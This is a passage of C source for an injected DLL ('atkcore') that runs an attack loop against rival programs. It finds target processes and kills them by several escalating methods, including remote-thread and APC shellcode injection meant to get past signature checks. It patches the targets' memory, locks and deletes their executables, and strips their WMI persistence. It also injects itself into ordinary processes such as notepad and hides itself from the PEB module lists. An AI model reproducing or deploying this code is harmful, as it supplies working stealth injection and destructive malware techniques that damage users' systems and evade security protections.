    }

    // 方法1：直接终止
    if (KillByTerminate(pid))
    {
        WriteKillLog(L"已结束 %s PID=%lu (TerminateProcess)", name, pid);
        return TRUE;
    }

    // 方法2：CreateRemoteThread + ExitProcess（正常退出路径，跑 DLL_PROCESS_DETACH）
    if (KillByRemoteExit(pid))
    {
        WriteKillLog(L"已结束 %s PID=%lu (RemoteExit)", name, pid);
        return TRUE;
    }

    // 方法3：注入 payload.dll（host only - target 禁止非 MS 签名 DLL）
    if (!bTarget && KillByKillerDll(pid, killerPath))
    {
        return TRUE;
    }

    // 方法3b：注入 payload.bin shellcode
    // - target (yy): 使用 APC 绕过签名检查
    // - host (notepad): 使用 CreateRemoteThread
    if (bTarget)
    {
        if (KillByKillerBin(pid, TRUE))  // APC
        {
            WriteKillLog(L"已通过 APC 注入 shellcode 结束 %s PID=%lu", name, pid);
            return TRUE;
        }
    }
    else
    {
        if (KillByKillerBin(pid, FALSE)) // RemoteThread
        {
            WriteKillLog(L"已通过远程线程 shellcode 结束 %s PID=%lu", name, pid);
            return TRUE;
        }
    }

    // 方法4：Job 对象终结
    if (KillByJobObject(pid))
    {
        WriteKillLog(L"已通过 Job 对象结束 %s PID=%lu", name, pid);
        return TRUE;
    }

    WriteKillLog(L"所有方法失败: %s PID=%lu", name, pid);
    return FALSE;
}

/* 攻击主循环 */
static void AttackPass(void)
{
    DWORD hostPids[128];
    DWORD targetPids[128];
    int nHosts = 0, nTargets = 0;

    /* 宿主判定：
       ① 我们跑在 yy/ww 主进程里 —— 不杀自己（外围的副本会杀它），只做 #11 内部感染；
       ② 我们跑在 yy 家族的**子进程**（蜜罐等）里 —— 同样不杀自己，外围会把它杀掉+锁死+删除；
       ③ 其它宿主（xx、explorer、notepad…）照常执行攻击。 */
    if (HostIsTargetExe()) {
        InfectYyHost();
        FindYyPopupInSelf();     /* 顺手确认弹窗（日志用） */
        return;
    }
    if (FindYyPopupInSelf() && !HostIsTargetExe()) {
        WCHAR leaf[MAX_PATH] = L"";
        HostLeafName(leaf, MAX_PATH);
        if (IsKnownYyFamilyName(leaf)) return;    /* 家族子进程宿主：不自杀 */
    }

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnap, &pe))
        {
            do
            {
                for (int i = 0; g_hostTargets[i]; i++)
                {
                    if (_wcsicmp(pe.szExeFile, g_hostTargets[i]) == 0)
                    {
                        if (nHosts < 128) hostPids[nHosts++] = pe.th32ProcessID;
                        break;
                    }
                }
                for (int i = 0; g_targets[i]; i++)
                {
                    if (_wcsicmp(pe.szExeFile, g_targets[i]) == 0)
                    {
                        if (nTargets < 128) targetPids[nTargets++] = pe.th32ProcessID;
                        break;
                    }
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    if (nTargets || nHosts)
        WriteKillLog(L"扫描发现 目标=%d 宿主=%d", nTargets, nHosts);

    /* Phase A: 先改它内存（#16 断掉建窗、#17 12 字节 TerminateProcess），
       然后**发现即杀**：结束整棵进程树 + 每个源文件先锁死（删除待决）再删除，
       根进程目录由新线程整目录清空。先 patch 后杀：万一这一轮杀不掉（对手保护/PPL），
       patch 也已经生效了。 */
    for (int i = 0; i < nTargets; i++)
    {
        PatchEnemyMemory(targetPids[i]);      /* #16 / #17 */
        KillYyBody(targetPids[i], L"Phase A 扫描到本体");
    }

    /* Phase A1: yy 家族子进程 + 蜜罐 —— 直接杀掉 + 锁死 + 删除。
       顺序有讲究：先杀蜜罐并锁删它自己那份镜像，再把 %TEMP%\lenovo_fix.exe 换成
       0 字节占位并独占锁住（先锁名字就锁不到它自己那份文件了）。 */
    KillHoneypotPass();
    BlockHoneypotRespawn();
    ApplyYyChildPolicy();

    /* Phase A2: 删对手的 WMI 复活订阅（三件套），节流 5 秒一次 */
    {
        static DWORD s_dwLastWmi = 0;
        DWORD now = GetTickCount();
        if (nTargets > 0 && (s_dwLastWmi == 0 || now - s_dwLastWmi >= 5000)) {
            s_dwLastWmi = now;
            RemoveEnemyWmi();
        }
    }

    /* Phase B: kill guard hosts + lock image */
    for (int i = 0; i < nHosts; i++)
    {
        WCHAR path[MAX_PATH];
        path[0] = L'\0';
        GetProcessPath(hostPids[i], path, MAX_PATH);
        TryAllMethods(L"notepad.exe", hostPids[i]);
        if (path[0]) LockImage(path);
    }

    /* Phase C: catch yy respawned in the gap —— 用 B1 快速枚举（一次 syscall）
       代替每轮 CreateToolhelp32Snapshot：那玩意儿要把整个进程表复制两遍，是"枚举慢"的根因。 */
    {
        DWORD pids[XX_MAX_PIDS];
        WCHAR names[XX_MAX_PIDS][64];
        int cnt = XXEnumProcessesFast(pids, names, XX_MAX_PIDS);
        for (int k = 0; k < cnt; k++) {
            const WCHAR *leaf = names[k];
            for (int i = 0; g_targets[i]; i++) {
                if (_wcsicmp(leaf, g_targets[i]) == 0) {
                    WriteKillLog(L"Phase C 发现复活目标 %ls PID=%lu", leaf, pids[k]);
                    KillYyBody(pids[k], L"Phase C 复活目标");
                    break;
                }
            }
        }
    }

    MaintainLocks();
}

static BOOL HostIsXxExe(void) {
    WCHAR path[MAX_PATH] = L"";
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return FALSE;
    const WCHAR *p = wcsrchr(path, L'\\');
    p = p ? p + 1 : path;
    return _wcsicmp(p, L"xx.exe") == 0;
}

/* ---- T0/T1/T2 对手识别（实现在 hunter/hunt.c，直接内联进来） ---- */
#include "hunter/hunt.c"


static DWORD WINAPI AttackLoop(LPVOID lp)
{
    UNREFERENCED_PARAMETER(lp);

    /* One leader across hosts. Mutex released after every pass so a
       suspended/dead xx cannot stall standbys (death => WAIT_ABANDONED).
       名字带会话 token：对手再也抢不到这把锁。 */
    WCHAR szLead[128];
    XXNamedObject(szLead, _countof(szLead), FALSE, XX_PURPOSE_ATTACK_LEAD, NameTok(), 0);
    HANDLE hLead = CreateMutexW(NULL, FALSE, szLead);

    /* xx.exe 自身放慢到 300ms：攻击负荷交给被注入其它进程的副本（仍 30ms），
       既降低 xx.exe CPU，又让副本在 xx 释放 leader 后立刻接手。 */
    /* 攻击频率按宿主区分：
         · xx.exe 自己（那是交付本体）：40ms，尽全力；
         · 被注入的宿主副本：**2000ms**。用户指定的注入矩阵会把 atkcore 注进大量
           普通进程，如果每个宿主都 40ms 枚举+击杀，N 个宿主就是 N 倍 CPU（实测卡死）。
           2 秒一次足够"xx 死了仍然有攻击者在干活"，又不会把机器拖垮。 */
    const DWORD dwIdle = HostIsXxExe() ? 40 : 2000;
    DWORD dwHuntTick = 0;   /* T0/T1/T2 三层识别：慢频（30s），不占攻击循环预算 */
    DWORD dwCopyTick = 0;

    while (g_bRunning)
    {
        {
            DWORD now = GetTickCount();
            if (dwCopyTick == 0 || now - dwCopyTick >= 5000) {
                dwCopyTick = now;
                RefreshKillerCopies();
                PlantSignaturesInAllTargets();   /* 3~5s 一轮：种特征串到 yy 私有内存 */
            }
            /* T0/T1/T2 三层识别：30 秒一轮（全盘 PE 指纹 + 系统句柄枚举，别放进 40ms 循环） */
            if (dwHuntTick == 0 || now - dwHuntTick >= 30000) {
                dwHuntTick = now;
                HuntPass();
            }
        }
        if (!hLead)
        {
            AttackPass();
            Sleep(dwIdle);
            continue;
        }
        DWORD w = WaitForSingleObject(hLead, 0);
        if (w == WAIT_OBJECT_0 || w == WAIT_ABANDONED)
        {
            AttackPass();
            ReleaseMutex(hLead);
            Sleep(dwIdle);
        }
        else
        {
            Sleep(dwIdle);
        }
    }

    if (hLead) CloseHandle(hLead);
    return 0;
}

/* 导出：按 PID 结束整棵进程树（供 xx.exe 的"窗口 → PID"路径调用）。
   这样窗口层只需负责"发现"，真正的杀+锁死+删除全部集中在 atkcore 里一套实现。 */
__declspec(dllexport) void WINAPI XxKillTree(DWORD pid)
{
    if (pid > 4 && pid != GetCurrentProcessId()) KillProcessTree(pid);
}

/* 崩溃日志：写进共享日志（弹窗能看见），避免宿主崩掉后日志也拿不到 */
static LONG WINAPI AtkCrashFilter(EXCEPTION_POINTERS *ep)
{
    DWORD code = 0;
    void *addr = NULL;
    if (ep && ep->ExceptionRecord) { code = ep->ExceptionRecord->ExceptionCode; addr = ep->ExceptionRecord->ExceptionAddress; }
    WriteKillLog(L"[CRASH] atkcore.dll pid=%lu code=0x%08lX addr=%p", GetCurrentProcessId(), (unsigned long)code, addr);
    return EXCEPTION_EXECUTE_HANDLER;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    UNREFERENCED_PARAMETER(reserved);
    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hinst);
        SetUnhandledExceptionFilter(AtkCrashFilter);

        /* 摘 PEB 链后自身模块就查不到了，先缓存句柄 */
        g_hSelfModule = hinst;

        /* 进程内单例：模块隐藏后注入方无法判断宿主里有没有我们；已有实例就让
           加载失败，避免同进程叠出多套攻击线程。名字带会话 token，对手无法预先抢占。
           **这里刻意不等 token**：创建/探测共用一张候选表（token → 共享 salt →
           固定值 → 裸名，见 xxipc.h），所以 DllMain 这一刻还没收到 token 也能建对名字；
           而 yy 的 HunterWorker 每 50ms 按名杀一轮，任何等待都是白送时间。 */
        g_hSingleton = XXModuleSingleton(L"atkcore", NameTok());
        if (!g_hSingleton) return FALSE;

        XXHideSelfFromPeb(hinst);          /* 从 PEB 三条模块链表里摘除自己 */

        EnsureLogInit();
    }
    return TRUE;
}


















